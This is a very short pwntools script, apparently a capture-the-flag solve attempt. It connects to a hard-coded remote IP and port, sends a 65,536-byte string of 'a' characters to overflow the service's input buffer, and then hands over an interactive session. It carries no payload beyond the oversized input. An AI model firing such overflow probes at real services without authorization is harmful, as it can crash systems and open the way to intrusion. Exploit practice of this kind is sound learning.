from pwn import *
context(log_level = "debug")

p = remote("218.2.197.235",23745)
p.sendline("a"*0x10000)
p.interactive()